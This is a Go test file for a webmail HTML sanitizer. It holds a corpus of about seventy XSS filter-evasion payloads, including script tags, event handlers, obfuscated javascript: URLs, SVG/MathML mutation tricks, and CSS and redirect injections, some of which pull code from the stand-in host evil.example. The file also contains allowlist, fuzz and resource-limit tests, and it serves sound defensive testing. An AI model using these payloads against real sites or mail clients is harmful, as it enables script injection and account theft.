package mail

import (
	"strings"
	"testing"

	"golang.org/x/net/html"
	"golang.org/x/net/html/atom"
)

// XSS corpus collected from the OWASP filter evasion cheat sheet, html5sec.org,
// PortSwigger's XSS cheat sheet and public webmail CVEs (Roundcube, SnappyMail,
// Zimbra). Every bypass ever found must be added here.
var xssCorpus = []string{
	// script and event handlers
	`<script>alert(1)</script>`,
	`<SCRIPT SRC=//evil.example/x.js></SCRIPT>`,
	`<img src=x onerror=alert(1)>`,
	`<img src="x" OnErRoR="alert(1)">`,
	`<body onload=alert(1)>`,
	`<details open ontoggle=alert(1)>`,
	`<div onmouseover="alert(1)">hover</div>`,
	`<marquee onstart=alert(1)>`,
	`<video><source onerror=alert(1)></video>`,
	`<input autofocus onfocus=alert(1)>`,
	`<select autofocus onfocus=alert(1)>`,
	`<keygen autofocus onfocus=alert(1)>`,
	`<textarea autofocus onfocus=alert(1)>`,
	// javascript: URLs and obfuscation
	`<a href="javascript:alert(1)">x</a>`,
	`<a href="JaVaScRiPt:alert(1)">x</a>`,
	`<a href=" javascript:alert(1)">x</a>`,
	"<a href=\"jav\tascript:alert(1)\">x</a>",
	"<a href=\"jav&#x09;ascript:alert(1)\">x</a>",
	`<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>`,
	`<a href="&#x6A;avascript:alert(1)">x</a>`,
	`<a href="javascript&colon;alert(1)">x</a>`,
	`<a href="vbscript:msgbox(1)">x</a>`,
	`<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`,
	`<a href="data:text/html,<script>alert(1)</script>">x</a>`,
	`<img src="javascript:alert(1)">`,
	`<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">`,
	`<iframe src="javascript:alert(1)"></iframe>`,
	`<iframe srcdoc="<script>alert(1)</script>"></iframe>`,
	`<object data="javascript:alert(1)"></object>`,
	`<embed src="javascript:alert(1)">`,
	`<form action="javascript:alert(1)"><button>go</button></form>`,
	`<button formaction="javascript:alert(1)">x</button>`,
	`<math><a xlink:href="javascript:alert(1)">x</a></math>`,
	// SVG and MathML namespace confusion (Roundcube CVE-2023-5631, CVE-2024-37383, CVE-2025-68461 class)
	`<svg onload=alert(1)>`,
	`<svg><script>alert(1)</script></svg>`,
	`<svg><animate onbegin=alert(1) attributeName=x dur=1s>`,
	`<svg><animate attributeName="href" values="javascript:alert(1)"/><a id=x><text>x</text></a></svg>`,
	`<svg><set attributeName="onmouseover" to="alert(1)"/></svg>`,
	`<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>`,
	`<svg><style><img src=x onerror=alert(1)></style></svg>`,
	`<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>`,
	`<math><mi><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>"></path></textarea></mtext></svg></mglyph></mi></math>`,
	// mutation XSS through raw-text elements
	`<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`,
	`<textarea><img title="</textarea><img src=x onerror=alert(1)>"></textarea>`,
	`<xmp><img title="</xmp><img src=x onerror=alert(1)>"></xmp>`,
	`<noembed><img title="</noembed><img src=x onerror=alert(1)>"></noembed>`,
	`<template><img src=x onerror=alert(1)></template>`,
	`<style><img src=x onerror=alert(1)></style>`,
	`<title><img src=x onerror=alert(1)></title>`,
	`<!--<img src=x onerror=alert(1)>-->`,
	`<![CDATA[<img src=x onerror=alert(1)>]]>`,
	`<p>a<!--</p><img src=x onerror=alert(1)>-->b</p>`,
	// CSS attacks
	`<div style="background:url(javascript:alert(1))">x</div>`,
	`<div style="background-image:url('https://evil.example/t.png')">x</div>`,
	`<div style="width:expression(alert(1))">x</div>`,
	`<div style="behavior:url(x.htc)">x</div>`,
	`<div style="-moz-binding:url(x.xml#xss)">x</div>`,
	`<div style="background:\75\72\6c(https://evil.example)">x</div>`,
	`<div style="color:red/**/;background:url(x)">x</div>`,
	`<div style="color:red;}</style><script>alert(1)</script>">x</div>`,
	`<style>@import url(https://evil.example/x.css);</style>`,
	`<link rel=stylesheet href=https://evil.example/x.css>`,
	`<div style="position:fixed;top:0;left:0;width:100%;height:100%">overlay</div>`,
	// document and navigation
	`<base href="https://evil.example/">`,
	`<meta http-equiv="refresh" content="0;url=https://evil.example">`,
	`<a href="https://ok.example" target="_self">x</a>`,
	`<img src="https://evil.example/x.png" srcset="javascript:alert(1) 1x">`,
	`<a href="#" id="__proto__">x</a>`,
	`<form id="x"><input name="attributes"></form>`,
}

// assertSafe re-parses sanitized output like a browser would and checks every
// element and attribute against the allowlist.
func assertSafe(t *testing.T, input, out string) {
	t.Helper()
	ctx := &html.Node{Type: html.ElementNode, Data: "body", DataAtom: atom.Body}
	nodes, err := html.ParseFragment(strings.NewReader(out), ctx)
	if err != nil {
		t.Fatalf("output does not parse: %v", err)
	}
	var walk func(*html.Node)
	walk = func(n *html.Node) {
		if n.Type == html.ElementNode {
			if n.Namespace != "" {
				t.Errorf("foreign element %s from %q", n.Data, input)
			}
			if _, ok := allowed[n.DataAtom]; !ok {
				t.Errorf("element <%s> not in allowlist (input %q, output %q)", n.Data, input, out)
			}
			for _, a := range n.Attr {
				k := strings.ToLower(a.Key)
				v := strings.ToLower(a.Val)
				if strings.HasPrefix(k, "on") || k == "srcset" || k == "formaction" || k == "action" || k == "id" || k == "name" {
					t.Errorf("attribute %s survived (input %q)", k, input)
				}
				if (k == "href" || k == "src") && v != "" && !strings.HasPrefix(v, "https://") && !strings.HasPrefix(v, "http://") &&
					!strings.HasPrefix(v, "mailto:") && !strings.HasPrefix(v, "tel:") && !strings.HasPrefix(v, "/img/") &&
					!strings.HasPrefix(v, "/api/inline") && !strings.HasPrefix(v, "data:image/png") && !strings.HasPrefix(v, "data:image/gif") &&
					!strings.HasPrefix(v, "data:image/jp") && !strings.HasPrefix(v, "data:image/webp") {
					t.Errorf("unsafe %s=%q survived (input %q)", k, a.Val, input)
				}
				if k == "style" && (strings.Contains(v, "url") || strings.Contains(v, "expression") || strings.Contains(v, `\`) || strings.Contains(v, "position")) {
					t.Errorf("unsafe style %q survived (input %q)", a.Val, input)
				}
				if k == "target" && v != "_blank" {
					t.Errorf("target %q survived", a.Val)
				}
			}
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			walk(c)
		}
	}
	for _, n := range nodes {
		walk(n)
	}
}

func TestSanitize_XSSCorpus(t *testing.T) {
	for _, allowRemote := range []bool{false, true} {
		o := opts
		o.AllowRemote = allowRemote
		for _, in := range xssCorpus {
			out := Sanitize(in, o).HTML
			assertSafe(t, in, out)
			low := strings.ToLower(out)
			for _, bad := range []string{"<script", "alert(1)</", "javascript:", "vbscript:", "<svg", "<math", "<iframe", "<object", "<embed", "<form", "<base", "<meta", "<link", "<style"} {
				if strings.Contains(low, bad) {
					t.Errorf("%q left %q: %s", in, bad, out)
				}
			}
		}
	}
}

func TestSanitize_KeepsLegitimateEmail(t *testing.T) {
	in := `<table width="600" cellpadding="0" cellspacing="0" bgcolor="#ffffff" style="border-collapse: collapse; margin: 0 auto">
	<tr><td align="center" style="padding: 24px; font-family: Arial, sans-serif; color: #111827">
	<h1 style="font-size: 24px; color: rgb(17, 24, 39)">Olá, Marina</h1>
	<p>Seu <b>pedido</b> foi <i>enviado</i>. <a href="https://loja.example/pedido/1">Acompanhar</a></p>
	<ul><li>Item 1</li><li>Item 2</li></ul>
	<p><font color="#55613a" face="Georgia">Assinatura</font><br>Equipe</p>
	<a href="mailto:ajuda@loja.example">ajuda@loja.example</a>
	</td></tr></table>`
	out := Sanitize(in, opts).HTML
	for _, want := range []string{
		`<table width="600" cellpadding="0" cellspacing="0" bgcolor="#ffffff" style="border-collapse: collapse; margin: 0 auto">`,
		`<td align="center" style="padding: 24px; font-family: Arial, sans-serif; color: #111827">`,
		`style="font-size: 24px; color: rgb(17, 24, 39)"`,
		`<b>pedido</b>`, `<i>enviado</i>`, `<ul><li>Item 1</li>`,
		`href="https://loja.example/pedido/1" target="_blank" rel="noopener noreferrer nofollow"`,
		`<font color="#55613a" face="Georgia">`, `href="mailto:ajuda@loja.example"`,
		`Olá, Marina`,
	} {
		if !strings.Contains(out, want) {
			t.Errorf("lost %q\nout: %s", want, out)
		}
	}
	if strings.Contains(out, `mailto:ajuda@loja.example" target`) {
		t.Error("mailto links must not open a new tab")
	}
}

func TestSanitize_EscapesText(t *testing.T) {
	out := Sanitize(`<p>5 &lt; 6 &amp; "aspas" &#60;script&#62;</p>`, opts).HTML
	if out != `<p>5 &lt; 6 &amp; &#34;aspas&#34; &lt;script&gt;</p>` {
		t.Errorf("text not escaped correctly: %s", out)
	}
}

func TestSanitize_ResourceLimits(t *testing.T) {
	for _, n := range []int{300, 5000} { // 300 hits our depth limit, 5000 the parser's
		deep := strings.Repeat("<div>", n) + "fim<script>alert(1)</script>" + strings.Repeat("</div>", n)
		out := Sanitize(deep, opts).HTML
		if !strings.Contains(out, "fim") || strings.Count(out, "<div>") > maxDepth+1 || strings.Contains(out, "<script") || strings.Contains(out, "alert") {
			t.Errorf("n=%d: deep nesting handled wrongly (%d divs)", n, strings.Count(out, "<div>"))
		}
	}
	wide := strings.Repeat("<b>x</b>", maxElements+100)
	if n := strings.Count(Sanitize(wide, opts).HTML, "<b>"); n > maxElements {
		t.Errorf("element limit not applied: %d", n)
	}
}

func FuzzSanitize(f *testing.F) {
	for _, s := range xssCorpus {
		f.Add(s)
	}
	f.Add(`<table><tr><td style="color:red">x</td></tr></table>`)
	f.Fuzz(func(t *testing.T, in string) {
		o := opts
		o.AllowRemote = len(in)%2 == 0
		assertSafe(t, in, Sanitize(in, o).HTML)
	})
}

func BenchmarkSanitize_Newsletter(b *testing.B) {
	row := `<tr><td align="center" style="padding: 12px; color: #333333; font-family: Arial"><a href="https://shop.example/p/1"><img src="https://cdn.example/p.jpg" width="120" alt="produto"></a><p>Produto em <b>promoção</b> por tempo limitado</p></td></tr>`
	in := `<table width="600">` + strings.Repeat(row, 800) + `</table>` // ~200 KB
	b.SetBytes(int64(len(in)))
	for i := 0; i < b.N; i++ {
		Sanitize(in, opts)
	}
}
